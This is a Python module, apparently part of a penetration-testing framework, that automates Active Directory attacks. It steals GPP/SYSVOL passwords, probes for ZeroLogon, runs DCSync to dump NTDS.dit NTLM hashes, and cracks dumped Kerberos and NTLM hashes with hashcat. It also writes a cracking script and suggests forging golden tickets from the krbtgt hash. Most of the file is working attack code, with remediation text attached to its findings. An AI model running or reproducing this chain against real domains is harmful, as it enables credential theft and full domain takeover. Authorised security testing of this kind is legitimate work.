"""VAJRA AD privilege-scalation / secret-dump operations (ad.privesc_ops).

Active-domain chain the agent can run after credential validation:
  - GPP / SYSVOL credential theft      (read-only, needs domain creds)
  - ZeroLogon / MS17-010-era probe     (nmap scripts, read-only)
  - DC-Sync  (NTDS.dit NTLM dump)      (--aggressive, needs creds)
  - bounded offline hashcat crack      (--aggressive, needs dumped hashes)
Every sub-operation is its own gate; nothing runs without evidence.
"""
import os
import re
import time
import subprocess

from core.database import Finding
from core.utils import which_tool

EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"
NTDS_RE = re.compile(r"^([^:\r\n]+):(\d+):([0-9a-fA-F]+):([0-9a-fA-F]{32}):::", re.M)
GPP_URL_RE = re.compile(r"https?://[^\s\"'<>]+?SYSVOL[^\s\"'<>]+")
GPP_CPASSWORD = "cpassword"

ZEROLOGON_NSE = "smb-vuln-zerologon"


def _ad(engine):
    return engine.state.get("ad") or {}


def _creds(engine):
    return getattr(engine, "ad_creds", {}) or {}


def _realm_name(engine):
    ad = _ad(engine)
    return ad.get("realm") or ad.get("domain") or ""


def creds_valid(engine, host):
    """Reuse the native SMB NTLMv2 validator; cache the verdict on engine."""
    if getattr(engine, "ad_valid", None) is not None:
        return engine.ad_valid
    from modules.ad.smb_recon import validate_creds
    creds = _creds(engine)
    st, _av = validate_creds(host, creds.get("user", ""),
                             password=creds.get("password"),
                             nthash=creds.get("nthash"),
                             domain=_ad(engine).get("domain", ""))
    valid = "VALID" in st.upper()
    engine.ad_valid = valid
    return valid


def run(engine):
    t = engine.target
    ad = _ad(engine)
    host = t.scan_host()
    creds = _creds(engine)
    realm = _realm_name(engine)
    box = []
    if creds.get("user") and creds_valid(engine, host):
        engine.log.info("[ad-ops] credentials VALID for the domain — active "
                        "chain unlocked")
        _gpp_passwords(engine, host, realm, creds)
        _dcsync(engine, host, realm, creds)
        box = engine.state.get("creds") or []
        if [c for c in box if "ntds" in c[0]]:
            engine.log.finding("[ad-ops] NTDS.dit dumped — NT hashes in state")
    else:
        engine.db.add_finding(Finding(
            t.display, "ad.privesc_ops", "coverage", "info",
            "Credential-dependent AD operations skipped%s"
            % (" (supplied creds rejected)" if creds.get("user") else ""),
            detail="GPP / DC-Sync / cracking need valid domain credentials "
                   "(pass --ad-user/--ad-pass/--nthash).",
            confidence="firm"))
    _zerologon_probe(engine, host)
    _crack_harness(engine)
    engine.db.add_event(t.display, "ad.privesc_ops",
                        "phase-complete")


def _run_cmd(engine, argv, timeout=90):
    try:
        r = subprocess.run(argv, capture_output=True, text=True,
                           timeout=timeout)
        return (r.stdout or "") + "\n" + (r.stderr or "")
    except Exception as e:
        return ""

def _gpp_passwords(engine, host, realm, creds):
    """GPP/SYSVOL cpassword theft via impacket Get-GPPPassword."""
    tool = which_tool("impacket-Get-GPPPassword", "Get-GPPPassword.py",
                      "Get-GPPPassword")
    if not tool:
        return
    user = creds.get("user", "")
    nthash = creds.get("nthash", "")
    auth = "%s\\%s" % (realm, user) if nthash else \
        "%s\\%s:%s" % (realm, user, creds.get("password", ""))
    argv = [tool, "-dc-ip", host] + (["-hashes", EMPTY_LM + ":" + nthash]
                                     if nthash else []) + [auth]
    out = _run_cmd(engine, argv, timeout=60)
    if not out:
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "coverage", "info",
            "GPP check produced no output (tool missing or share closed)",
            confidence="possible"))
        return
    found = [ln for ln in out.splitlines()
             if "PASS" in ln.upper() or "@@" in ln or "user" in ln.lower()
             and ":" in ln]
    hits = [ln.strip() for ln in out.splitlines() if "@@:" in ln or
            re.search(r"(?i)(password|pass|cpassword)\s*[:=]", ln)]
    if hits:
        ev = engine.save_evidence("gpp_creds.txt", out[:4000])
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "credentials", "high",
            "ADMIN CREDENTIALS in SYSVOL GPP policy (%d)" % len(hits),
            detail="Group Policy Preferences stored a 'cpassword' — the "
                   "obsolete AES key decrypts it offline.%s"
                   % ("\nEvidence: " + ev if ev else ""),
            evidence="\n".join(hits[:8])[:1200],
            remediation="Remove GPP credential settings; rotate any password "
                        "ever shipped via SYSVOL.", confidence="firm"))
        engine.log.finding("[ad-ops] SYSVOL/GPP credentials recovered")
    if not found and not hits:
        engine.db.add_event(engine.target.display, "ad.privesc_ops",
                            "gpp-clean")


def _zerologon_probe(engine, host):
    """Safe authoritative probe via the local nmap NSE when available."""
    import shutil
    if not shutil.which("nmap"):
        return
    try:
        out = subprocess.run(
            ["nmap", "-p", "445", "--script", ZEROLOGON_NSE, "-n",
             "--host-timeout", "50s", "--script-timeout", "40s", host],
            capture_output=True, text=True, timeout=100).stdout
    except Exception:
        return
    low = out.lower()
    if "zerologon" not in low and "vulnerable" not in low:
        return
    if "vulnerable" in low and "not vulnerable" not in low:
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "verified-exposure",
            "critical", "ZEROLOGON (CVE-2020-1472) — DC vulnerable",
            detail="nmap smb-vuln-zerologon confirmed the Netlogon "
                   "strong-key regression against this host.",
            evidence=out[:1500],
            remediation="Apply the August 2020 security update; audit for "
                        "previous exploitation (krbtgt/DC machine account).",
            confidence="firm"))
        engine.log.finding("[ad-ops] ZEROLOGON VERIFIED on %s" % host)
    else:
        engine.db.add_event(engine.target.display, "ad.privesc_ops",
                            "zerologon-clean")


def _dcsync(engine, host, realm, creds):
    if not getattr(engine.args, "aggressive", False):
        return
    tool = which_tool("impacket-secretsdump", "secretsdump.py")
    if not tool:
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "coverage", "info",
            "DC-Sync unavailable (impacket-secretsdump missing)",
            detail="With valid domain credentials VAJRA replays DCSync "
                   "(DRSUAPI GetNCChanges) to extract NTDS.dit hashes.",
            confidence="firm"))
        return
    dc = _dc_target(engine, host)
    user = creds.get("user", "")
    nthash = creds.get("nthash", "")
    argv = [tool, "-just-dc", "-dc-ip", dc]
    if nthash:
        argv += ["-hashes", EMPTY_LM + ":" + nthash]
    auth = "%s@%s" % (user, host)
    if not nthash:
        argv += ["-no-pass"]
    argv.append(auth)
    # A bare -no-pass with a real password is ambiguous; impacket wants the
    # password in the auth string. Use the explicit form instead.
    if not nthash:
        auth = "%s\\%s:%s@%s" % (realm, user, creds.get("password", ""), host)
        argv = [tool, "-just-dc", "-dc-ip", dc, auth]
    else:
        argv = [tool, "-just-dc", "-dc-ip", dc,
                "-hashes", EMPTY_LM + ":" + nthash,
                "%s\\%s@%s" % (realm, user, host)]
    out = _run_cmd(engine, argv, timeout=150)
    if not out:
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "coverage", "info",
            "DC-Sync produced no output (access revoked / tool missing)",
            confidence="possible"))
        return
    rows = NTDS_RE.findall(out)
    if rows:
        unique = {r[1]: (r[0], r[3]) for r in rows}
        lines = ["%s:%s:%s:%s:::" % (user_, uid, LM, nt)
                 for uid, (user_, (LM, nt)) in
                 sorted(unique.items())]
        ev = engine.save_evidence("dcsync_ntds_hashes.txt",
                                  "\n".join(lines[:500]))
        box = engine.state.setdefault("creds", [])
        for uid, (user_, nt) in sorted(unique.items())[:120]:
            ent = ("ad/ntds", user_, "NT:" + nt.upper())
            if ent not in box:
                box.append(ent)
        engine.state["ad"]["ntds_dumped"] = True
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "exploit-proof",
            "critical", "[VERIFIED] DCSYNC — %d NTDS.dit NTLM hashes dumped"
            % len(unique),
            detail="DRSUAPI GetNCChanges replayed with valid credentials "
                   "yielded the domain database.\nCrack offline: hashcat -m "
                   "1000%s.%s"
                   % ("\nSaved to %s" % ev if ev else "",
                      "\nGOLDEN TICKET: use the krbtgt hash to forge "
                      "tickets with impacket-ticketer."),
            evidence="\n".join(lines[:8]),
            remediation="Treat domain as compromised: enable LAPS, enforce "
                        "MFA, reset krbtgt twice (with safe-guard cadences), "
                        "audit privileged accounts.",
            confidence="firm"))
        engine.log.finding("[ad-ops] DCSYNC dumped %d accounts" % len(unique))
    elif any(k in out for k in ("DCERPC Runtime Error", "rpc_s_access_denied",
                                "ACCESS_DENIED", "sAMAccountName")):
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "coverage", "info",
            "DCSync denied (account lacks Replication rights)",
            detail=out[-500:], confidence="firm"))
    else:
        engine.db.add_finding(Finding(
            engine.target.display, "ad.privesc_ops", "coverage", "info",
            "DCSync completed without harvestable hashes",
            detail=out[-400:], confidence="possible"))


def _dc_target(engine, host):
    ad = _ad(engine)
    for d in ad.get("dcs", []):
        if d.get("host", "").lower() != host.lower():
            return d["host"]
    return host


def _crack_harness(engine):
    """Offline crack of whatever hashes we produced (kerberoast / asrep /
    dcsync). Always drops an operator harness; --aggressive attempts a
    bounded hashcat pass and reports cracked accounts as credentials."""
    ev_dir = engine.state.get("evidence_dir", "")
    if not ev_dir or not os.path.isdir(ev_dir):
        return
    targets = []
    for fname, mode in (("kerberoast_hashes.txt", 13100),
                        ("asrep_hashes.txt", 18200),
                        ("dcsync_ntds_hashes.txt", 1000)):
        p = os.path.join(ev_dir, fname)
        if os.path.exists(p) and os.path.getsize(p) > 0:
            targets.append((fname, mode))
    if not targets:
        return
    hashcat = which_tool("hashcat")
    wl = engine.wordlist_path(
        "passwords_full.txt" if engine.deep else "passwords.txt")
    script = ["#!/usr/bin/env bash",
              "# VAJRA offline-crack harness — crack dumped AD hashes",
              "set -euo pipefail",
              "HASH_FILE=${1:?usage: crack.sh <hashfile>; modes: %s}"
              % ",".join(str(m) for _f, m in targets),
              "POT=%s/hashcat.pot" % ev_dir, ""]
    for fname, mode in targets:
        script.append(
            "hashcat -m %d -a 0 --potfile-path \"$POT\" \"%s/%s\" \"%s\" "
            "--runtime 180 -w 1 || true" % (mode, ev_dir, fname, wl))
    script.append('hashcat --potfile-path "$POT" --show "%s/%s" 2>/dev/null'
                  % (ev_dir, targets[0][0]))
    ev = engine.save_evidence("crack_chain.sh", "\n".join(script) + "\n")
    engine.db.add_finding(Finding(
        engine.target.display, "ad.privesc_ops", "post-recon", "info",
        "Offline credential-crack harness ready (%d hash set(s))" %
        len(targets),
        detail="Points hashcat at the dumped hashes with the active "
               "wordlist tier.%s" % ("\nEvidence: " + ev if ev else ""),
        evidence="modes: %s" % ",".join(str(m) for _f, m in targets),
        confidence="firm"))
    if not hashcat or not getattr(engine.args, "aggressive", False):
        return
    _bounded_crack(engine, targets, hashcat, wl)


def _bounded_crack(engine, targets, hashcat, wl):
    words = int(engine.cfg("crack_budget_pwds", 8000))
    runtime = int(engine.cfg("crack_runtime_seconds", 120))
    pot = os.path.join(engine.state.get("evidence_dir", ""), "hashcat.pot")
    cracked = []
    for fname, mode in targets:
        p = os.path.join(engine.state.get("evidence_dir", ""), fname)
        size = os.path.getsize(p)
        if size > 4096:
            head = p + ".cap"
            try:
                with open(p, encoding="utf-8") as f:
                    headlines = f.readlines()[:max(2, 1200 // max(1, size // words))]
                    headlines = headlines[:max(2, min(words // 100, 80))]
                    with open(head, "w", encoding="utf-8") as g:
                        g.write("".join(headlines))
            except Exception:
                head = p
        else:
            head = p
        try:
            argv = [hashcat, "-m", str(mode), "-a", "0",
                    "--potfile-path", pot, "--runtime",
                    str(runtime), "-w", "1", "--quiet",
                    "--outfile-format", "2", "-o", pot + ".out",
                    head, wl]
            subprocess.run(argv, capture_output=True, text=True, timeout=runtime + 25)
            if os.path.exists(pot + ".out"):
                for ln in open(pot + ".out", encoding="utf-8", errors="replace"):
                    if ":" in ln.strip():
                        cracked.append((ln.strip(), mode))
        except Exception:
            continue
    if not cracked:
        return
    box = engine.state.setdefault("creds", [])
    lines = []
    for ln, mode in cracked:
        user, _, pw = ln.partition(":")
        lines.append("%s (mode %d) = %s" % (user[:60], mode, pw[:60]))
        ent = ("ad/golden-crack", user.split("@")[0].strip("$"), pw)
        if ent not in box:
            box.append(ent)
    ev = engine.save_evidence("cracked_accounts.txt", "\n".join(lines))
    engine.db.add_finding(Finding(
        engine.target.display, "ad.privesc_ops", "credentials", "critical",
        "[VERIFIED] %d AD account password(s) CRACKED offline" % len(cracked),
        detail="Bounded hashcat pass against dumped Kerberos/NTDS material "
               "recovered plaintext credentials.%s"
               % ("\nSaved to " + ev if ev else ""),
        evidence="\n".join(lines)[:1500],
        remediation="Rotate every cracked account immediately; crackable "
                    "passwords signal a policy problem.",
        confidence="firm"))
    engine.log.finding("[ad-ops] %d account(s) cracked offline" % len(cracked))